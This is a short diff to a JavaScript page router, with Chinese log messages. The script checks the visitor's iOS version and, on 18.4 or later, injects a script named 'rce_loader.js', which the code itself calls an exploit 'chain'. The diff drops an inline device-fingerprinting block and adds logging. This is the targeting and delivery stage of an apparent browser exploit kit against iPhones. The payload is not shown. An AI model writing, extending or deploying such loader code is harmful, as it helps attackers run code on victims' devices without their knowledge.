@@ -14,23 +14,26 @@
 
   var ver = getIOSVersion();
 
-  // 内联设置指纹，确保 ds_rce_loader.js 加载前 window.FINGERPRINT 已就绪
-  (function() {
-    var hash = 0;
-    var input = ua + '|' + (navigator.language||'') + '|' + screen.width + 'x' + screen.height;
-    for (var i = 0; i < input.length; i++) { hash = ((hash << 5) - hash) + input.charCodeAt(i); hash |= 0; }
-    var fp = Math.abs(hash).toString(16);
-    while (fp.length < 64) { fp += Math.abs((hash * (fp.length + 1))).toString(16); }
-    window.FINGERPRINT = fp.substring(0, 64);
-  })();
+  
+  function rlog(msg) {
+    var line = '[router] ' + msg;
+    try { console.log('[log] ' + line); } catch(e) {}
+    try { if (window.__logViewAdd) window.__logViewAdd(line); } catch(e) {}
+  }
+
+  rlog('iOS version: ' + ver + (ver ? '' : '(非 iOS 环境)'));
 
   function loadScript(src) {
     var s = document.createElement('script');
     s.src = src + '?' + Date.now();
+    s.onerror = function() { rlog('加载失败: ' + src); };
     document.head.appendChild(s);
   }
 
   if (ver >= 180400) {
-    loadScript('ds_rce_loader.js');
+    rlog('加载 rce_loader.js');
+    loadScript('rce_loader.js');
+  } else {
+    rlog('iOS 版本未达 18.4,不加载链(页面将保持空白)');
   }
 })();
